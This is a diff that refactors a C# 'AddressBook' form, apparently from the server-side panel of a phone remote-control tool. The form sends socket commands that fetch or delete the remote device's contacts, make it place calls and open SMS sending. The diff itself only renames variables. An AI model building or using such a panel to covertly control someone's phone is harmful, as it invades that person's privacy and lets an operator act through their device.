@@ -6,11 +6,17 @@ namespace Server.Views
 {
     public partial class AddressBook : Form
     {
-        Socket sco; public string ID = "";
-        public AddressBook(Socket sck, string aydi)
+        Socket socket;
+        public string Id = "";
+        /// <summary>
+        /// Creates a new <see cref="AddressBook"/> instance
+        /// </summary>
+        /// <param name="socket"></param>
+        /// <param name="id"></param>
+        public AddressBook(Socket socket, string id)
         {
             InitializeComponent();
-            ID = aydi; sco = sck;
+            Id = id; this.socket = socket;
         }
         public void bilgileriIsle(string arg)
         {
@@ -39,14 +45,14 @@ namespace Server.Views
         }
         private void ekleToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            new AddContact(sco).Show();
+            new AddContact(socket).Show();
         }
 
         private void silToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
-                MainWindow.GoToOurSocket("REHBERSIL", "[VERI]" + listView1.SelectedItems[0].Text + "[VERI][0x09]", sco);
+                MainWindow.GoToOurSocket("REHBERSIL", "[VERI]" + listView1.SelectedItems[0].Text + "[VERI][0x09]", socket);
                 listView1.SelectedItems[0].Remove();
                 Text = "Adress Book";
             }
@@ -57,7 +63,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.GoToOurSocket("REHBERIVER", "[VERI][0x09]", sco);
+                MainWindow.GoToOurSocket("REHBERIVER", "[VERI][0x09]", socket);
                 Text = "Adress Book";
             }
             catch (Exception) { }
@@ -69,7 +75,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.GoToOurSocket("ARA", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sco);
+                    MainWindow.GoToOurSocket("ARA", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", socket);
                     MessageBox.Show("Arama talimatı gönderildi.", "Arama", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
                 }
@@ -81,7 +87,7 @@ namespace Server.Views
         {
             if (listView1.SelectedItems.Count == 1)
             {
-                new SMS(sco, listView1.SelectedItems[0].SubItems[1].Text).Show();
+                new SMS(socket, listView1.SelectedItems[0].SubItems[1].Text).Show();
             }
         }
 
